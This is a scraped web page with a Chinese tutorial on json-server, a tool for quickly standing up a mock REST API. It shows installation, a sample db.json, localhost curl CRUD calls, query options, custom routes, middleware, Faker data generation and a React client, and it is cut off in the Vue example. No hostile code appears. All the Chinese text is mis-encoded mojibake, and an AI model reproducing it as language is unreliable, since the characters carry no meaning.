API"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T17:12:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å·¦Pythonå³Java"/> <meta itemprop="url" content="https://juejin.cn/user/4107431173952525"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ json-server å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ REST API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431173952525/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å·¦Pythonå³Java
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T17:12:30.000Z" title="Fri Jan 02 2026 17:12:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">json-server ä½¿ç”¨æ•™ç¨‹</h2>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ json-server</h3>
<p>json-server æ˜¯ä¸€ä¸ªåŸºäº Node.js çš„å·¥å…·ï¼Œå¯ä»¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ REST APIï¼Œä½¿ç”¨ JSON æ–‡ä»¶ä½œä¸ºæ•°æ®æºã€‚éå¸¸é€‚åˆå‰ç«¯å¼€å‘ã€åŸå‹è®¾è®¡å’Œæµ‹è¯•ã€‚</p>
<h3 data-id="heading-2">å®‰è£…</h3>
<h4 data-id="heading-3">å…¨å±€å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash">npm install -g json-server
</code></pre>
<h4 data-id="heading-4">æœ¬åœ°å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash">npm install json-server --save-dev
</code></pre>
<h4 data-id="heading-5">ä½¿ç”¨ npxï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash">npx json-server
</code></pre>
<h3 data-id="heading-6">å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-7">1. åˆ›å»ºæ•°æ®æ–‡ä»¶</h4>
<p>åˆ›å»ºä¸€ä¸ª <code>db.json</code> æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"posts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç¬¬ä¸€ç¯‡æ–‡ç« "</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¼ ä¸‰"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç¬¬äºŒç¯‡æ–‡ç« "</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æå››"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"comments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¾ˆå¥½çš„æ–‡ç« "</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"postId"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"profile"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"typicode"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-8">2. å¯åŠ¨æœåŠ¡å™¨</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é»˜è®¤ç«¯å£ 3000</span>
json-server db.json

<span class="hljs-comment"># æŒ‡å®šç«¯å£</span>
json-server db.json --port 4000

<span class="hljs-comment"># æŒ‡å®šä¸»æœº</span>
json-server db.json --host 0.0.0.0

<span class="hljs-comment"># é™é»˜æ¨¡å¼</span>
json-server db.json --quiet

<span class="hljs-comment"># ç›‘è§†æ–‡ä»¶å˜åŒ–</span>
json-server db.json --watch
</code></pre>
<h4 data-id="heading-9">3. è®¿é—® API</h4>
<p>å¯åŠ¨åï¼ŒæœåŠ¡å™¨ä¼šæä¾›ä»¥ä¸‹ç«¯ç‚¹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># èµ„æºç«¯ç‚¹</span>
GET    /posts
GET    /posts/1
POST   /posts
PUT    /posts/1
PATCH  /posts/1
DELETE /posts/1

<span class="hljs-comment"># å…¶ä»–èµ„æº</span>
GET    /comments
GET    /profile
</code></pre>
<h3 data-id="heading-10">REST API æ“ä½œ</h3>
<h4 data-id="heading-11">GET - è·å–æ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è·å–æ‰€æœ‰æ–‡ç« </span>
curl http://localhost:3000/posts

<span class="hljs-comment"># è·å–æŒ‡å®š ID çš„æ–‡ç« </span>
curl http://localhost:3000/posts/1

<span class="hljs-comment"># è·å–ä¸ªäººèµ„æ–™</span>
curl http://localhost:3000/profile
</code></pre>
<h4 data-id="heading-12">POST - åˆ›å»ºæ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºæ–°æ–‡ç« </span>
curl -X POST http://localhost:3000/posts \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{
    "title": "æ–°æ–‡ç« ",
    "author": "ç‹äº”"
  }'</span>

<span class="hljs-comment"># ä½¿ç”¨ JavaScript fetch</span>
fetch(<span class="hljs-string">'http://localhost:3000/posts'</span>, {
  method: <span class="hljs-string">'POST'</span>,
  headers: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  },
  body: JSON.stringify({
    title: <span class="hljs-string">'æ–°æ–‡ç« '</span>,
    author: <span class="hljs-string">'ç‹äº”'</span>
  })
})
</code></pre>
<h4 data-id="heading-13">PUT - å®Œæ•´æ›´æ–°</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®Œæ•´æ›´æ–°æ–‡ç« ï¼ˆå¿…é¡»åŒ…å«æ‰€æœ‰å­—æ®µï¼‰</span>
curl -X PUT http://localhost:3000/posts/1 \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{
    "id": 1,
    "title": "æ›´æ–°åçš„æ ‡é¢˜",
    "author": "å¼ ä¸‰"
  }'</span>
</code></pre>
<h4 data-id="heading-14">PATCH - éƒ¨åˆ†æ›´æ–°</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># éƒ¨åˆ†æ›´æ–°æ–‡ç« ï¼ˆåªæ›´æ–°æŒ‡å®šå­—æ®µï¼‰</span>
curl -X PATCH http://localhost:3000/posts/1 \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{
    "title": "åªæ›´æ–°æ ‡é¢˜"
  }'</span>
</code></pre>
<h4 data-id="heading-15">DELETE - åˆ é™¤æ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤æ–‡ç« </span>
curl -X DELETE http://localhost:3000/posts/1
</code></pre>
<h3 data-id="heading-16">é«˜çº§æŸ¥è¯¢</h3>
<h4 data-id="heading-17">è¿‡æ»¤</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‰å­—æ®µè¿‡æ»¤</span>
GET /posts?author=å¼ ä¸‰

<span class="hljs-comment"># å¤šæ¡ä»¶è¿‡æ»¤</span>
GET /posts?author=å¼ ä¸‰&amp;<span class="hljs-built_in">id</span>=1

<span class="hljs-comment"># åµŒå¥—å±æ€§è¿‡æ»¤</span>
GET /comments?postId=1
</code></pre>
<h4 data-id="heading-18">åˆ†é¡µ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†é¡µæŸ¥è¯¢</span>
GET /posts?_page=1&amp;_limit=10

<span class="hljs-comment"># è·å–æ€»æ•°ï¼ˆåœ¨å“åº”å¤´ X-Total-Count ä¸­ï¼‰</span>
</code></pre>
<h4 data-id="heading-19">æ’åº</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å‡åºæ’åº</span>
GET /posts?_sort=<span class="hljs-built_in">id</span>&amp;_order=asc

<span class="hljs-comment"># é™åºæ’åº</span>
GET /posts?_sort=<span class="hljs-built_in">id</span>&amp;_order=desc

<span class="hljs-comment"># å¤šå­—æ®µæ’åº</span>
GET /posts?_sort=author,<span class="hljs-built_in">id</span>&amp;_order=asc,desc
</code></pre>
<h4 data-id="heading-20">åˆ‡ç‰‡</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># èŒƒå›´æŸ¥è¯¢</span>
GET /posts?_start=0&amp;_end=10

<span class="hljs-comment"># é™åˆ¶æ•°é‡</span>
GET /posts?_limit=5

<span class="hljs-comment"># è·³è¿‡æ•°é‡</span>
GET /posts?_start=5
</code></pre>
<h4 data-id="heading-21">æ“ä½œç¬¦</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤§äº</span>
GET /posts?id_gte=1

<span class="hljs-comment"># å°äº</span>
GET /posts?id_lte=10

<span class="hljs-comment"># ä¸ç­‰äº</span>
GET /posts?id_ne=1

<span class="hljs-comment"># åŒ…å«</span>
GET /posts?q=å…³é”®è¯

<span class="hljs-comment"># æ­£åˆ™è¡¨è¾¾å¼</span>
GET /posts?id_like=1
</code></pre>
<h4 data-id="heading-22">å…¨æ–‡æœç´¢</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœç´¢åŒ…å«å…³é”®è¯çš„è®°å½•</span>
GET /posts?q=æ–‡ç« 

<span class="hljs-comment"># æœç´¢ä¼šåœ¨æ‰€æœ‰å­—æ®µä¸­æŸ¥æ‰¾</span>
</code></pre>
<h4 data-id="heading-23">å…³è”æŸ¥è¯¢</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è·å–æ–‡ç« åŠå…¶è¯„è®º</span>
GET /posts/1?_embed=comments

<span class="hljs-comment"># è·å–è¯„è®ºåŠå…¶æ‰€å±æ–‡ç« </span>
GET /comments?_expand=post

<span class="hljs-comment"># åµŒå¥—å¤šä¸ªå…³ç³»</span>
GET /posts/1?_embed=comments&amp;_embed=likes
</code></pre>
<h3 data-id="heading-24">é…ç½®é€‰é¡¹</h3>
<h4 data-id="heading-25">å‘½ä»¤è¡Œé€‰é¡¹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®Œæ•´å‘½ä»¤ç¤ºä¾‹</span>
json-server db.json \
  --port 4000 \
  --host 0.0.0.0 \
  --watch \
  --routes routes.json \
  --middlewares middleware.js \
  --static ./public \
  --read-only \
  --no-cors
</code></pre>
<h4 data-id="heading-26">é€‰é¡¹è¯´æ˜</h4>













































<table><thead><tr><th>é€‰é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>--port</code></td><td>æŒ‡å®šç«¯å£å·ï¼ˆé»˜è®¤ 3000ï¼‰</td></tr><tr><td><code>--host</code></td><td>æŒ‡å®šä¸»æœºåœ°å€ï¼ˆé»˜è®¤ localhostï¼‰</td></tr><tr><td><code>--watch</code></td><td>ç›‘è§†æ–‡ä»¶å˜åŒ–</td></tr><tr><td><code>--routes</code></td><td>è‡ªå®šä¹‰è·¯ç”±æ–‡ä»¶</td></tr><tr><td><code>--middlewares</code></td><td>ä¸­é—´ä»¶æ–‡ä»¶</td></tr><tr><td><code>--static</code></td><td>é™æ€æ–‡ä»¶ç›®å½•</td></tr><tr><td><code>--read-only</code></td><td>åªè¯»æ¨¡å¼ï¼ˆç¦ç”¨ POST/PUT/DELETEï¼‰</td></tr><tr><td><code>--no-cors</code></td><td>ç¦ç”¨ CORS</td></tr><tr><td><code>--quiet</code></td><td>é™é»˜æ¨¡å¼</td></tr></tbody></table>
<h3 data-id="heading-27">è‡ªå®šä¹‰è·¯ç”±</h3>
<h4 data-id="heading-28">åˆ›å»ºè·¯ç”±æ–‡ä»¶</h4>
<p>åˆ›å»º <code>routes.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"/api/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/$1"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"/:resource/:id/show"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/:resource/:id"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"/posts/:category"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/posts?category=:category"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"/articles\\?id=:id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/posts/:id"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-29">ä½¿ç”¨è‡ªå®šä¹‰è·¯ç”±</h4>
<pre><code class="hljs language-bash" lang="bash">json-server db.json --routes routes.json
</code></pre>
<h4 data-id="heading-30">è·¯ç”±ç¤ºä¾‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸå§‹è·¯ç”±</span>
GET /posts/1

<span class="hljs-comment"># è‡ªå®šä¹‰è·¯ç”±</span>
GET /api/posts/1        <span class="hljs-comment"># æ˜ å°„åˆ° /posts/1</span>
GET /posts/1/show       <span class="hljs-comment"># æ˜ å°„åˆ° /posts/1</span>
GET /posts/tech         <span class="hljs-comment"># æ˜ å°„åˆ° /posts?category=tech</span>
</code></pre>
<h3 data-id="heading-31">ä¸­é—´ä»¶</h3>
<h4 data-id="heading-32">åˆ›å»ºä¸­é—´ä»¶</h4>
<p>åˆ›å»º <code>middleware.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// æ·»åŠ å“åº”å¤´</span>
  res.<span class="hljs-title function_">header</span>(<span class="hljs-string">'X-Custom-Header'</span>, <span class="hljs-string">'Custom Value'</span>)
  
  <span class="hljs-comment">// è®°å½•è¯·æ±‚</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${req.method}</span> <span class="hljs-subst">${req.url}</span>`</span>)
  
  <span class="hljs-comment">// æ¨¡æ‹Ÿå»¶è¿Ÿ</span>
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'delay'</span>)) {
    <span class="hljs-built_in">setTimeout</span>(next, <span class="hljs-number">2000</span>)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>()
  }
}
</code></pre>
<h4 data-id="heading-33">ä½¿ç”¨ä¸­é—´ä»¶</h4>
<pre><code class="hljs language-bash" lang="bash">json-server db.json --middlewares middleware.js
</code></pre>
<h4 data-id="heading-34">é«˜çº§ä¸­é—´ä»¶ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// èº«ä»½éªŒè¯æ¨¡æ‹Ÿ</span>
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">'POST'</span> &amp;&amp; !req.<span class="hljs-property">headers</span>.<span class="hljs-property">authorization</span>) {
    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Unauthorized'</span> })
  }
  
  <span class="hljs-comment">// è¯·æ±‚æ—¥å¿—</span>
  <span class="hljs-keyword">const</span> timestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${timestamp}</span>] <span class="hljs-subst">${req.method}</span> <span class="hljs-subst">${req.url}</span>`</span>)
  
  <span class="hljs-comment">// ä¿®æ”¹å“åº”</span>
  <span class="hljs-keyword">const</span> originalSend = res.<span class="hljs-property">send</span>
  res.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) {
    <span class="hljs-keyword">const</span> modifiedData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data)
    modifiedData.<span class="hljs-property">timestamp</span> = timestamp
    originalSend.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(modifiedData))
  }
  
  <span class="hljs-title function_">next</span>()
}
</code></pre>
<h3 data-id="heading-35">æ•°æ®ç”Ÿæˆ</h3>
<h4 data-id="heading-36">ä½¿ç”¨ Faker.js ç”Ÿæˆæµ‹è¯•æ•°æ®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> faker = <span class="hljs-built_in">require</span>(<span class="hljs-string">'faker'</span>)
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">generateData</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> users = []
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++) {
    users.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">id</span>: i,
      <span class="hljs-attr">name</span>: faker.<span class="hljs-property">name</span>.<span class="hljs-title function_">findName</span>(),
      <span class="hljs-attr">email</span>: faker.<span class="hljs-property">internet</span>.<span class="hljs-title function_">email</span>(),
      <span class="hljs-attr">phone</span>: faker.<span class="hljs-property">phone</span>.<span class="hljs-title function_">phoneNumber</span>(),
      <span class="hljs-attr">address</span>: {
        <span class="hljs-attr">street</span>: faker.<span class="hljs-property">address</span>.<span class="hljs-title function_">streetAddress</span>(),
        <span class="hljs-attr">city</span>: faker.<span class="hljs-property">address</span>.<span class="hljs-title function_">city</span>(),
        <span class="hljs-attr">country</span>: faker.<span class="hljs-property">address</span>.<span class="hljs-title function_">country</span>()
      },
      <span class="hljs-attr">company</span>: faker.<span class="hljs-property">company</span>.<span class="hljs-title function_">companyName</span>()
    })
  }
  
  <span class="hljs-keyword">const</span> db = { users }
  fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">'db.json'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(db, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))
}

<span class="hljs-title function_">generateData</span>()
</code></pre>
<h4 data-id="heading-37">è¿è¡Œç”Ÿæˆå™¨</h4>
<pre><code class="hljs language-bash" lang="bash">node generate-data.js
json-server db.json
</code></pre>
<h3 data-id="heading-38">ä¸å‰ç«¯æ¡†æ¶é›†æˆ</h3>
<h4 data-id="heading-39">React ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = <span class="hljs-string">'http://localhost:3000'</span>

<span class="hljs-comment">// è·å–æ‰€æœ‰æ–‡ç« </span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getPosts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/posts`</span>)
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
}

<span class="hljs-comment">// åˆ›å»ºæ–‡ç« </span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">createPost</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">post</span>) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/posts`</span>, post)
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
}

<span class="hljs-comment">// æ›´æ–°æ–‡ç« </span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">updatePost</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id, post</span>) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">put</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/posts/<span class="hljs-subst">${id}</span>`</span>, post)
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
}

<span class="hljs-comment">// åˆ é™¤æ–‡ç« </span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">deletePost</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id</span>) =&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">delete</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/posts/<span class="hljs-subst">${id}</span>`</span>)
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
}
</code></pre>
<h4 data-id="heading-40">Vue ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>

<span class="hljs-keyword">const</span> api = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'http://localhost:3000'</span>
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getPosts</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/posts'</span>)
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
  },
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">createPost</span>(<span class="hljs-params">post</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/posts'</span>, post)
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
  },
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">updatePost</span>(<span class="hljs-params">id, post</span>) {
